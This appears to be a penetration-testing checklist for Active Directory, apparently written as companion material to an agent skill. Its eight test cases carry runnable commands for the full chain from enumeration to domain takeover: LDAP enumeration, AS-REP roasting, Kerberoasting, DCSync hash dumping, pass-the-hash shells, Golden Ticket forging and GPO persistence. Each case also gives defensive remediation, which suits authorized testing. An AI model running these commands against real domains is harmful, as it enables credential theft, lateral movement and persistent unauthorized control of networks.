# Active Directory and LDAP Attack Test Cases

> This file is a companion to `SKILL.md`, providing structured test case templates for AD and LDAP attack scenarios.
> Purpose: Check each item during penetration testing to ensure no critical attack paths are missed. Each case includes prerequisites, steps, expected results, and severity level.
> All tests are intended solely for authorized security assessments.

---

## Test Case Format

```
TC-ADXXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Remediation: Recommended defensive actions
Pass Criteria: How to verify the test succeeded
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. Reconnaissance](#a-reconnaissance)
- [B. Enumeration](#b-enumeration)
- [C. Kerberos Attacks](#c-kerberos-attacks)
- [D. Credential Harvesting](#d-credential-harvesting)
- [E. Lateral Movement](#e-lateral-movement)
- [F. Domain Dominance](#f-domain-dominance)

---

## A. Reconnaissance

### TC-AD001 | Active Directory Domain Reconnaissance via NetBIOS and DNS

- **Severity**: MEDIUM
- **Objective**: Identify the target Active Directory domain name, domain controllers, and network topology through passive and semi-passive reconnaissance techniques.
- **Prerequisites**:
  - Network access to the target environment (Layer 3 connectivity)
  - Target IP range or subnet identified (e.g., 10.10.0.0/24)
  - No authentication credentials required for initial discovery phase
  - Kali Linux with nbtscan, dnsutils, and nmap installed
- **Test Steps**:
  1. Perform NetBIOS scan across the target subnet using `nbtscan 10.10.0.0/24` to identify hostnames, domain names, and domain controller indicators
  2. Query DNS SRV records for domain controllers: `nslookup -type=srv _ldap._tcp.dc._msdcs.corp.local`
  3. Query Kerberos service records: `nslookup -type=srv _kerberos._tcp.corp.local`
  4. Perform targeted port scan on identified DCs: `nmap -sV -p 53,88,135,389,445,636,3268 10.10.0.1`
  5. Verify SMB signing status: `crackmapexec smb 10.10.0.1`
- **Expected Result**: Domain name (e.g., corp.local) is discovered, domain controller IP addresses are identified, and key service ports (Kerberos-88, LDAP-389, SMB-445) are confirmed open on DC systems.
- **Remediation**: Restrict DNS zone transfers, disable unnecessary DNS SRV information exposure, implement network segmentation around domain controllers, and monitor for unusual DNS query patterns.
- **Pass Criteria**: At minimum, the domain name and at least one domain controller IP address must be successfully identified. Verification includes confirming Kerberos, LDAP, and SMB services are accessible on the identified DC.
- **Reference**: payloads.md Section 1 - Domain Reconnaissance

---

### TC-AD002 | LDAP Enumeration of Domain Objects

- **Severity**: HIGH
- **Objective**: Enumerate domain users, groups, computers, Service Principal Names (SPNs), and security configurations through authenticated LDAP queries against the domain controller.
- **Prerequisites**:
  - Valid domain credentials (even low-privileged accounts suffice)
  - Network access to the domain controller LDAP port (389 or 636)
  - Domain name and domain controller IP identified (from TC-AD001)
  - ldapsearch, ldapdomaindump, and ldeep installed on Kali
- **Test Steps**:
  1. Bind to LDAP and query root DSE: `ldapsearch -x -H ldap://10.10.0.1 -b "" -s base namingcontexts`
  2. Enumerate all domain users: `ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName`
  3. Enumerate Domain Admins group members: `ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" sAMAccountName`
  4. Enumerate SPNs: `ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName`
  5. Find AS-REP Roastable users (DONT_REQ_PREAUTH flag): `ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName`
  6. Run ldapdomaindump for comprehensive export: `ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' 10.10.0.1`
- **Expected Outcome**: Complete list of domain users (including privileged accounts), group memberships (especially Domain Admins), all SPNs registered in the domain, accounts with pre-authentication disabled, and exported HTML/JSON domain reports for offline analysis.
- **Remediation**: Implement LDAP query auditing (Event ID 1644), restrict anonymous and low-privilege LDAP access, deploy LDAP signing and channel binding, and monitor for high-volume enumeration queries.
- **Verification**: The test passes when at least 5 domain users, 3 groups, and 2 SPNs are successfully enumerated. The ldapdomaindump output should contain valid HTML and JSON files with domain object data.
- **Reference**: payloads.md Section 2 - LDAP Enumeration

---

## C. Kerberos Attacks

### TC-AD003 | Kerberos AS-REP Roasting

- **Severity**: CRITICAL
- **Purpose**: Identify and exploit user accounts with Kerberos pre-authentication disabled by extracting encrypted credential hashes from AS-REP responses for offline cracking.
- **Pre-condition**:
  - Knowledge of target domain name and domain controller address
  - Either a list of valid usernames or authenticated LDAP access to enumerate users
  - impacket GetNPUsers.py installed and operational
  - Wordlist for offline cracking (e.g., rockyou.txt)
- **Test Steps**:
  1. If user list is not available, enumerate users via LDAP or enum4linux first
  2. Run GetNPUsers with user list: `impacket-GetNPUsers corp.local/ -usersfile userlist.txt -format hashcat -outputfile asrep_hashes.txt`
  3. Alternatively, with valid credentials, auto-discover roastable users: `impacket-GetNPUsers corp.local/svc_ldap:'Password123!' -request -format hashcat -outputfile asrep_hashes.txt`
  4. Examine extracted hashes for valid AS-REP structures (verify `$krb5asrep$` prefix)
  5. Crack hashes offline: `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`
  6. Verify cracked credentials by authenticating: `crackmapexec smb 10.10.0.1 -u cracked_user -p cracked_pass`
- **Expected Result**: At least one AS-REP hash is extracted from accounts with pre-authentication disabled. Offline cracking reveals the plaintext password for at least one account. Successful authentication confirms the cracked credential is valid.
- **Defense**: Enable Kerberos pre-authentication for all accounts, especially service accounts. Audit userAccountControl attributes regularly for the DONT_REQ_PREAUTH flag (0x400000). Monitor Event ID 4768 for TGT requests without pre-authentication.
- **Pass Criteria**: Test passes when at least one AS-REP hash is obtained and the hash format is valid (confirmed by hashcat/john acceptance). Full success requires cracking at least one password and confirming authentication.
- **Reference**: payloads.md Section 3 - Kerberos AS-REP Roasting

---

### TC-AD004 | Kerberoasting Attack

- **Severity**: CRITICAL
- **Objective**: Exploit service accounts registered with SPNs by requesting TGS tickets encrypted with the service account password hash, then cracking them offline to obtain service account credentials.
- **Prerequisite**:
  - Valid domain credentials (any authenticated user can request TGS tickets)
  - Network access to domain controller Kerberos service (port 88)
  - At least one SPN registered to a user account (not a computer account)
  - impacket GetUserSPNs.py, hashcat or john installed on Kali
- **Test Steps**:
  1. List all available SPNs: `impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -no-preauth`
  2. Request TGS tickets for all service accounts: `impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request -outputfile tgs_hashes.txt`
  3. Review extracted hashes -- identify RC4-encrypted tickets (etype 23) as higher value targets
  4. Crack TGS hashes with hashcat: `hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt`
  5. Alternatively crack with John: `john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt`
  6. Validate cracked credentials: `crackmapexec smb 10.10.0.1 -u svc_mssql -p cracked_password`
  7. Assess impact -- check if service account has privileged group memberships or delegation rights
- **Expected Outcome**: TGS ticket hashes are extracted for all service accounts with registered SPNs. At least one service account password is cracked. The cracked account may reveal Domain Admin privileges, constrained delegation rights, or access to sensitive resources.
- **Mitigation**: Use Group Managed Service Accounts (gMSA) instead of traditional service accounts. Enforce AES-256 encryption for service accounts (set msDS-SupportedEncryptionTypes to 0x18). Implement long, complex passwords (25+ characters) for service accounts. Monitor Event ID 4769 for RC4-encryption TGS requests.
- **Verification**: Test passes when at least one valid TGS hash is extracted (format confirmed by hashcat/john). Full success requires cracking at least one service account password and confirming the credential works for authentication.
- **Reference**: payloads.md Section 4 - Kerberoasting

---

## D. Credential Harvesting

### TC-AD005 | DCSync Credential Harvesting

- **Severity**: CRITICAL
- **Purpose**: Demonstrate full domain credential extraction by performing the DCSync attack to dump all password hashes from the NTDS.dit database via DRSUAPI replication.
- **Pre-condition**:
  - Domain Admin or equivalent privileges (Replicating Directory Changes + Replicating Directory Changes All ACL)
  - Network access to domain controller (port 135 RPC and 445 SMB)
  - impacket secretsdump.py installed on Kali
  - Understanding of domain SID and krbtgt account significance
- **Test Steps**:
  1. Verify current privileges: confirm the compromised account has Domain Admin membership
  2. Perform full DCSync dump: `impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx`
  3. Extract specific krbtgt hash for Golden Ticket potential: `impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -just-dc-user "krbtgt"`
  4. Save all extracted hashes to organized output files: `impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -outputfile domain_dump`
  5. Validate extracted hashes by testing PTH against another domain system: `crackmapexec smb 10.10.0.5 -u administrator -H 'extracted_ntlm_hash'`
  6. Document all extracted credentials, noting krbtgt hash, Domain Admin hashes, and service account hashes
- **Expected Result**: All domain user password hashes (NTLM) are extracted, including the krbtgt hash, Domain Admin hashes, service account hashes, and machine account hashes. The output file contains hundreds or thousands of hash entries depending on domain size. PTH validation confirms at least one hash works for lateral movement.
- **Remediation**: Restrict Replicating Directory Changes permissions to only domain controllers. Deploy Microsoft Advanced Threat Protection (ATP) to detect DRSUAPI abuse. Monitor Event ID 4662 for DS-Replication-Get-Changes operations from non-DC sources. Implement Privileged Access Management with just-in-time access for admin operations.
- **Checklist**:
  - [ ] All domain user hashes extracted successfully
  - [ ] krbtgt hash identified and documented
  - [ ] Domain Admin hashes identified and validated via PTH
  - [ ] Service account hashes cataloged for further exploitation assessment
  - [ ] Output files saved and organized for reporting
  - [ ] Attack evidence preserved for penetration test report
- **Reference**: payloads.md Section 7 - DCSync Attack

---

## E. Lateral Movement

### TC-AD006 | Pass-the-Hash Lateral Movement

- **Severity**: CRITICAL
- **Goal**: Demonstrate lateral movement across the domain using harvested NTLM hashes without requiring plaintext passwords, verifying the extent of credential reuse and admin access.
- **Prerequisites**:
  - At least one valid NTLM hash (obtained from credential dumping, Kerberoasting, or DCSync)
  - Network access to target systems (SMB port 445)
  - Target IP range or specific host IPs identified
  - crackmapexec, impacket psexec/wmiexec/smbexec installed on Kali
- **Test Steps**:
  1. Identify valid targets by spraying the hash across the network: `crackmapexec smb 10.10.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx'`
  2. Identify hosts with admin access marked as "Pwn3d!" in crackmapexec output
  3. Enumerate logged-on users on accessible targets: `crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --loggedon-users`
  4. Execute command via psexec for shell access: `impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx`
  5. Alternatively use wmiexec for stealthier access: `impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx`
  6. Dump local SAM on newly accessed target: `crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --sam`
- **Expected Result**: Multiple hosts across the network accept the NTLM hash for authentication. At least one host provides administrative shell access via psexec or wmiexec. Additional credential hashes are harvested from accessed systems for further lateral movement.
- **Defense**: Enable SMB signing on all systems to prevent NTLM relay. Implement Windows Defender Credential Guard to protect credential derivatives. Deploy network segmentation to limit lateral movement paths. Monitor Event IDs 4624 (logon type 3) for unusual authentication patterns across multiple systems.
- **Pass Criteria**: Test passes when at least one target host successfully authenticates via PTH and a command shell is obtained. Full success requires demonstrating access to at least 3 different systems and harvesting credentials from at least one new system.
- **Reference**: payloads.md Section 5 - Pass-the-Hash, Section 8 - Lateral Movement

---

## F. Domain Dominance

### TC-AD007 | Golden Ticket Persistence

- **Severity**: CRITICAL
- **Objective**: Demonstrate persistent domain dominance by forging a Golden Ticket using the krbtgt hash, which maintains access even after password changes for all accounts except krbtgt.
- **Pre-condition**:
  - krbtgt NTLM hash obtained (from DCSync in TC-AD005)
  - Domain SID identified (e.g., S-1-5-21-XXXXXX-XXXXXX-XXXXXX)
  - Domain name known
  - impacket ticketer.py installed on Kali
- **Test Steps**:
  1. Retrieve the domain SID: `impacket-lookupsid corp.local/svc_ldap:'Password123!'@10.10.0.1`
  2. Forge Golden Ticket with krbtgt hash: `impacket-ticketer -nthash 'krbtgt_hash' -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -user-id 500 -groups 512,513,518,519,520 administrator`
  3. Set the Kerberos ticket: `export KRB5CCNAME=administrator.ccache`
  4. Access domain controller via forged ticket: `impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass`
  5. Verify Domain Admin access by enumerating domain users: execute `net user /domain` in the obtained shell
  6. Perform DCSync again using the forged ticket to confirm full persistence: `impacket-secretsdump corp.local/administrator@dc01.corp.local -k -no-pass`
- **Expected Outcome**: A forged Golden Ticket is successfully created and used to authenticate as Domain Admin without any password or hash (only the krbtgt hash from initial compromise). The ticket grants full domain admin access including the ability to dump all credentials, modify AD objects, and access any system in the domain.
- **Remediation**: Reset the krbtgt account password twice (with 12+ hour interval) to invalidate existing Golden Tickets. Implement tiered administration to prevent krbtgt hash exposure. Deploy Microsoft ATA/ATP to detect Golden Ticket usage via anomalous ticket lifetimes and encryption types. Monitor for Event ID 4624 logons with no corresponding Event ID 4768 TGT request.
- **Verification**:
  - [ ] Golden Ticket forged successfully (administrator.ccache created)
  - [ ] Authentication via ticket succeeds without password or NTLM hash
  - [ ] Domain Admin privileges confirmed (can enumerate/modify domain objects)
  - [ ] DCSync works via forged ticket (confirms full domain compromise)
  - [ ] Ticket survives across target system reboots (persistency confirmed)
- **Reference**: payloads.md Section 9 - Golden Ticket Attack

---

### TC-AD008 | Domain Dominance via DCSync and GPO Abuse

- **Severity**: CRITICAL
- **Purpose**: Demonstrate full domain dominance by combining DCSync credential harvesting with GPO manipulation to establish persistent access across all domain-joined systems through Group Policy deployment.
- **Pre-requisite**:
  - Domain Admin or equivalent privileges (from previous TCs or initial compromise)
  - Network access to domain controller (SMB and LDAP)
  - Understanding of GPO structure and SYSVOL share
  - crackmapexec, impacket, and ldeep installed on Kali
- **Test Steps**:
  1. Perform full DCSync to harvest all domain hashes: `impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx -outputfile full_dump`
  2. Enumerate existing GPOs: `ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 gpos`
  3. Enumerate GPO with crackmapexec: `crackmapexec smb 10.10.0.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --gpo`
  4. Access SYSVOL share to locate GPO structure: `impacket-smbclient corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx`
  5. Document the GPO deployment path and note that modification of GPO preferences XML can deploy scheduled tasks across all systems in the GPO scope
  6. Forge Golden Ticket as backup persistence: `impacket-ticketer -nthash 'krbtgt_hash' -domain-sid S-1-5-21-XXXX -domain corp.local administrator`
  7. Verify persistence by accessing multiple domain systems using harvested hashes and forged tickets
- **Expected Result**: All domain credentials are harvested including service accounts, machine accounts, and the krbtgt hash. GPO structure is mapped and modifiable. A persistence strategy combining Golden Ticket (for krbtgt-based persistence) and GPO manipulation (for broad deployment) is demonstrated. Multiple systems are accessible using harvested credentials.
- **Mitigation**: Implement GPO change auditing and approval workflows. Monitor SYSVOL share modifications via Event IDs 5136, 5141. Deploy Privileged Access Management with time-bounded admin access. Regularly audit GPO permissions and delegation settings. Implement LAPS for local admin password randomization.
- **Pass Criteria**:
  - [ ] All domain hashes successfully extracted via DCSync
  - [ ] GPO structure enumerated and modifiable paths identified
  - [ ] Golden Ticket forged and validated
  - [ ] At least 3 domain systems accessible using harvested credentials
  - [ ] Persistence mechanisms documented for penetration test report
  - [ ] Full attack chain from recon to dominance is demonstrable
- **Reference**: payloads.md Section 7, Section 9, Section 11 - Domain Dominance
